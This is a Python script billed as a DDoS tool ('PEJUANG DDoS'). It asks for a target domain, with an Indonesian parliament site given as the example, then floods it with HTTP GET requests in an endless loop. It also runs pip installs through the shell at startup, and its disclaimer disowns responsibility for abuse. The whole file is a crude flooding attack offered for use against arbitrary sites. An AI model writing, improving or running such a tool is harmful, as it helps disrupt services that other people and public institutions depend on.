import os
import time
os.system('pip install termcolor && pip install colored && pip install requests && clear')
import termcolor
from termcolor import colored

def main():
    
    

    print(colored("************************",'blue'))
    print(colored("*                      *",'blue'))
    print(colored("*    PEJUANG DDoS      *",'blue'))
    print(colored("*                      *",'blue'))
    print(colored("************************",'blue'))

    print(colored("Created By MataKucing\n", 'green'))

main()
print (colored("PLEASE READ THIS\n\n WE ARE NOT RESPONSIBLE IF YOU ABUSE IT!!",'red'))
print(colored("CTRL + C IF YOU WANT TO ABORT!...\n",'red'))
for i in range(10, 0, -1):
        time.sleep(1)
        print(colored("" + str(i +1),'yellow'))
import requests
def dos():

        s = input(colored("enter your target\n example: dpr.go.id\n\n ~> ",'magenta'))

        r = requests.get("http://"+s)

        print(colored("\nPocket was sent",'red'))

        r = requests.get("http://"+s)

        print(colored("Pocket was sent",'blue'))

        r = requests.get("http://"+s)

        print(colored("Pocket was sent",'red'))

        r = requests.get("http://"+s)

        print(colored("Pocket was sent",'blue'))

        c = input(colored("Do you want continue? y/n? ~> ",'yellow'))

        if c == 'y':
            while True:
                r = requests.get("http://"+s)
                print(colored("Pocket was sent", 'red'))
                r = requests.get("http://"+s)
                print(colored("Pocket was sent", 'blue'))
        elif c == 'n':
            os.system('clear')
            main()
            dos()


dos()